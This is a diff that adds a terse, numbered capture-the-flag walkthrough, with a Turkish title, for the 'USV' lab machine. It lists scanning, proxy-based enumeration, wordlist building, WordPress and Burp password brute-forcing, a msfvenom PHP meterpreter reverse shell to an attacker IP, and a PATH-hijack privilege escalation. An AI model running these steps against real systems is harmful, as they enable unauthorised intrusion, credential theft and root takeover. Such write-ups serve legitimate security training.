@@ -1,0 +1,32 @@
+USV MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.46 bulundu.
+2 - nmap -sT -A -p- 192.168.2.46
+3 - Firefox -> Proxy -> 192.168.2.46 - 3129
+4 - gobuster dir -u http://192.168.2.46/ --proxy http://192.168.2.46:3129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+5 - nikto -h 192.168.2.35 -useproxy http://192.168.2.46:3129/
+6 - wpscan --url http://192.168.2.46/blog/ --proxy http://192.168.2.46:3129/ -e u, mother_of_dragon, sti
+7 - http://192.168.2.46/blog/ -> Protected
+8 - cewl --proxy_host 192.168.2.46 --proxy_port 3129 -w usv_cewl.txt http://192.168.2.46/blog/
+9 - Burp Suite -> Intruder -> Sniper -> usv_cewl.txt, westerosi
+10 - mother_of_dragons : in front of your eyes, ftp 192.168.2.46 21211
+11 - cat .note.txt -> Dragons: Drogon - Rhaegal - Viserion, usv_wp.txt:
+ViserionDrogonRhaegal
+ViserionRhaegalDrogon
+DrogonViserionRhaegal
+DrogonRhaegalViserion
+RhaegalViserionDrogon
+RhaegalDrogonViserion
+viseriondrogonrhaegal
+viserionrhaegaldrogon
+drogonviserionrhaegal
+drogonrhaegalviserion
+rhaegalviseriondrogon
+rhaegaldrogonviserion
+12 - wpscan --url http://192.168.2.46/blog/ --proxy http://192.168.2.46:3129/ -e p --usernames mother_of_dragons --passwords usv_wp.txt
+13 - mother_of_dragons : RhaegalDrogonViserion
+14 - msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.2.128 lport=4444 -f raw
+15 - msfconsole, use exploit/multi/handler, set payload php/meterpreter/reverse_tcp
+16 - echo '/bin/bash' > /tmp/shell
+17 - chmod 777 /tmp/shell
+18 - export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+19 - ./winterfell_messenger, whoami
